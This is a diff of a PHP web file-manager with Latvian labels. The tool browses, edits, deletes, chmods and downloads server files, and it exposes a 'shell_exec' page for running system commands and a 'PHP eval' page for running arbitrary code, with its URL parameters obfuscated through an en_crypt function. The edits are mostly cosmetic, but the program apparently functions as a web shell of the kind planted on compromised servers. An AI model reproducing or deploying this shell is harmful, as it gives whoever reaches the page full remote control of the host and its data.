@@ -244,6 +244,7 @@ if(isset($_GET['icon'])){
 	if($icon=='view'){
 		$iconimg='iVBORw0KGgoAAAANSUhEUgAAAAsAAAALCAYAAACprHcmAAAAAXNSR0IArs4c6QAAAdtJREFUGNM10ctr03AAB/BvkiZpt7g2dmvXJz7QXkTQwQoe5sEddCjqwZse1D9A/BNkuyjiwasnQQ9z0A4FQXspTHFsvip1Wtptfdo1Tfr6pUnTpokX/fwLHwr/PE2sxsSpmZv77e0r+sgQzWGtkt449mpYbbzMvHuiAAADAHcfP7xsTdSSpkAvBcJnZyMR3j3prUY3mwuXJEm4MEW100QuKcxW9nvsV28tOT8X9p8MxjEtBAAqBHkURMflg+RyBgUuOecZBVbpxCftVgtBv/vQBFzsGF7+ADaCINYCWN6B07EXOHGeOveH7FynX38eLrWoOIhRxsAsoNCN4EB3QNaBjsHCKxTBiTzE4+KiQzN7Yo5cxNsyjRCnwKZkdMeHUSIGfNwjuJ11SMoRwCnN0vyYlBTVwIfmDaQa1zAcr6CuriHXA7KdOPKtU4h6fgIDpU7HJo1EN1dAW7Wwp86grHOY5pfRNQjy2h1sVh+gViRQfmvvaY9deR6QM1tkt4x+n0Gjb+Fj8z5UMwS6r8MoKsius2lx5FtnMttpw+c0N+T87hmG9UdB72G/fg90S4K58w2D1LOU8fXH7baqKNT/QfBHBSYyf9WmyCLlCgfsXqViDdQUpC9vYGk6APwFNSjdDm02+7IAAAAASUVORK5CYII=';
 	}
+
 	if($icon=='edit'){
 		$iconimg='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlz
 AAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAJwSURB
@@ -278,6 +279,7 @@ if(isset($_GET['leja'])&&isset($_GET['c'])){
 	$urll=$_GET['leja'];
 	
 	$mm_type='application/octet-stream';
+
 	header('Cache-Control: public, must-revalidate');
 	header('Content-Type: '.$mm_type);
 	//header("Content-Length: " .(string)(filesize($urll)) );
@@ -296,7 +298,7 @@ header('content-type: text/html; charset=utf-8');
 
 if(isset($_GET['shell'])){
 
-echo'<p><a href="'.$pats.'" title="back">BACK</a></p>';
+echo'<p><a href="'.$pats.'" title="back" onClick="history.back()">BACK</a></p>';
 
 ?>
 <form method="post" action="<?php echo $pats.'?'.en_crypt('shell=1');?>">
@@ -333,7 +335,7 @@ die();
 
 if(isset($_GET['eval'])){
 
-echo'<p><a href="'.$pats.'" title="back">BACK</a></p>';
+echo'<p><a href="'.$pats.'" title="back" onClick="history.back()">BACK</a></p>';
 
 ?>
 <form method="post" action="<?php echo $pats.'?'.en_crypt('eval=1');?>">
@@ -391,9 +393,7 @@ p{margin:0px;padding:2px 0px;}
 h1{font-size:medium;}
 img{border:0;}
 .ic{font-size:24px;margin-right:-4px;}
-checkbox{
-font-size:16px;
-}
+.warn{background:#FFFFFF;color:red;}
 textarea{}
 </style>
 
@@ -487,7 +487,6 @@ function direktorija($dir,$i,$dziljums){
 				
 				#AAAA
 				$filu_css=($k%2?'c':'d');
-
 				$ext=substr(strrchr($dir.'/'.$lasitfailus[$k],'.'),1);
 				
 				$skat_img=($shimg==1 ? '<img src="'.$pats.'?'.en_crypt('icon=view').'" alt="" />':'[view]');
@@ -526,11 +525,22 @@ if(!isset($_POST['limic'])){
 	$limic_val=$_POST['limic'];
 }
 
-echo'<div class="kaste"><div class="inl"><a href="./">Adminis</a> <a href="'.$pats.'?'.en_crypt('shell=1').'" title="Execute command via shell and return the complete output as a string">shell_exec</a> <a href="'.$pats.'?'.en_crypt('eval=1').'" title="Evaluate a string as PHP code">PHP eval</a> <h1> '.$versija.' </h1>
-<p><a href="'.$pats.'">Sākums</a></p>
+echo'<div class="kaste">
+
+
+
+<!--<a href="./">Adminis</a>-->
+
+<h1 class="inl"><a href="'.$pats.'">'.$versija.'</a></h1>
+<p class="inl"><a href="'.$pats.'?'.en_crypt('shell=1').'" title="Execute command via shell and return the complete output as a string">shell_exec</a> <a href="'.$pats.'?'.en_crypt('eval=1').'" title="Evaluate a string as PHP code">PHP eval</a></p>
+
+
+<!--<p><a href="'.$pats.'">Sākums</a></p>-->
+
 <p>Augstāka direktorija: <a href="'.$pats.'?'.en_crypt('dir='.$uzaugshu.'').'">'.$uzaugshu.'</a></p>
 <p>Esošā darba direktorija: <strong><a href="'.$pats.'?'.en_crypt('dir='.$dir.'').'">'.$dir.'</a></strong></p>
-<p>
+
+
 <form id="meklis" name="meklis" action="'.$pats.'?'.en_crypt('dir='.$dir.'').'" method="post">
 Meklēt datnēs vārdu: 
 <input size="30" name="vaig" id="vaig" /> 
@@ -538,8 +548,9 @@ datnes izmēra limits(bytes):
 <input size="12" name="limic" id="limic" value="'.$limic_val.'" />
 <input type="submit" name="mekmek" value=" Meklēt " />
 </form>
-</p>
-<p>Direktoriju, datņu saraksts:(chmod, izmērs, gads-mēnesis-diena, laiks)</p></div>
+
+
+<p>Direktoriju, datņu saraksts:(chmod, izmērs, gads-mēnesis-diena, laiks)</p>
 <div class="nav"> </div>';
 if(isset($_POST['vaig'])&&!empty($_POST['vaig'])){
 	$k=0;
@@ -567,14 +578,14 @@ if(isset($_POST['vaig'])&&!empty($_POST['vaig'])){
 
 			$urlis = mapURL($dir);
 			$urlis=str_replace("\\",'/',$urlis);
+
+			$filu_css=($k%2?'c':'d');
+			$ext=substr(strrchr($filename,'.'),1);
 			
 			$icon_view=($shimg==1 ? '<img src="'.$pats.'?'.en_crypt('icon=view').'" alt="" />':'[view]');
 			$moz_icon=($shimg==1 ? '<img src="moz-icon://.'.$ext.'?size=16" alt="'.$ext.'" />':'['.$ext.']');
 			
 			$skat='<a href="'.$urlis.'/'.$filenamex['basename'].'">'.$icon_view.'</a> ';
-
-			$filu_css=($k%2?'c':'d');
-			$ext=substr(strrchr($filename,'.'),1);
 
 			$druka='<div class="'.$filu_css.'" onmouseover="fa(this);" onmouseout="fb(this);"> '.$skat.$sleja.' '.$moz_icon.'<em class="dir">'.$saite.'</em><em class="chmod">'.substr(base_convert(fileperms($filename),10,8),3).'</em><em class="kb">'.ceil(filesize($filename)/1024).' KiB</em><em class="data">'.gmdate('[ Y-m-d, H:i:s ]',2*3600+filemtime($filename)).'</em>  <del title="dzēst!">'.$saitedz.'</del></div>
 ';
@@ -626,7 +637,7 @@ if(p('dzfailu')=='yes'){
 }
 if(p('chm')=='yes'){
 	$c=p('cx');
-	$mode_dec=octdec($_POST['chmn']);
+	$mode_dec=octdec(p('chmn'));
 	chmod($c,$mode_dec);
 }
 if(p('labot')=='yes'){
@@ -678,13 +689,17 @@ if(file_exists($f)){
 		echo'</p>';
 	}
 }
-if(isset($c)){
+if(isset($c)&&strlen($deurl)>0){
 	if(!file_exists($f)){
-		echo'<h1>Dzēsts vai nav datnes !</h1>';
+		echo'<h1 class="warn">Dzēsts vai nav datnes !</h1>';
 	}
 }
 if($izvdir=='yes'){
-	mkdir($f,0666);
+	
+	$oldumask = umask(0);
+	mkdir($f,0777);
+	umask($oldumask);
+	
 	die("<script type=\"text/javascript\">window.location='".$pats."?".en_crypt("dir=$dir")."';</script>");
 }
 if($izvfailu=='yes'){
@@ -712,25 +727,25 @@ Esošā darba direktorija :  <input class="balts" name="dirx" type="text" size="
 </p>
 <p>
 <strong>Apstrādājamais fails vai direktorija</strong>: <input class="cels" name="cx" type="text" size="60" value="'.$c.'" />
-chmod:<input type="checkbox" name="chm" value="yes" />
+chmod:<input type="radio" name="chm" value="yes" />
 <input name="chmn" type="text" size="4" value="0777" />
 </p>
 <p>
 Atzīmēt ko darīt ar apstrādājamo datni vai direktoriju:
 </p>
 <p>
-Skatīt:<strong class="ic">☞</strong><input type="checkbox" name="faili" value="yes" />
-Labot:<strong class="ic">✎</strong><input type="checkbox" name="labot" value="yes" />
-Izveidot datni:<strong class="ic">☺</strong><input type="checkbox" name="izvfailu" value="yes" />
-Dzēst datni:<strong class="ic">⚔</strong><input type="checkbox" name="dzfailu" value="yes" />
-Izveidot direktoriju:<strong class="ic">☺</strong><input type="checkbox" name="izvdir" value="yes" />
-Dzēst direktoriju:<strong class="ic">⚔</strong><input type="checkbox" name="dzdir" value="yes" />
+Skatīt:<strong class="ic">☞</strong><input type="radio" name="faili" value="yes" />
+Labot:<strong class="ic">✎</strong><input type="radio" name="labot" value="yes" />
+Izveidot datni:<strong class="ic">☺</strong><input type="radio" name="izvfailu" value="yes" />
+Dzēst datni:<strong class="ic">⚔</strong><input type="radio" name="dzfailu" value="yes" />
+Izveidot direktoriju:<strong class="ic">☺</strong><input type="radio" name="izvdir" value="yes" />
+Dzēst direktoriju:<strong class="ic">⚔</strong><input type="radio" name="dzdir" value="yes" />
 <input class="dar" type="submit" name="Submit" value=" Darīt lietas " />
 </p>
 <p>
-Kopēt datni ar jaunu nosaukumu:<strong class="ic">⚭</strong><input type="checkbox" name="cp" value="yes" />
+Kopēt datni ar jaunu nosaukumu:<strong class="ic">⚭</strong><input type="radio" name="cp" value="yes" />
 <input name="cop" type="text" size="10" value="" />
-Pārdēvēt datni ar jaunu nosaukumu:<strong class="ic">✌</strong><input type="checkbox" name="ren" value="yes" />
+Pārdēvēt datni ar jaunu nosaukumu:<strong class="ic">✌</strong><input type="radio" name="ren" value="yes" />
 <input name="renn" type="text" size="10" value="" />
 </p>';
 
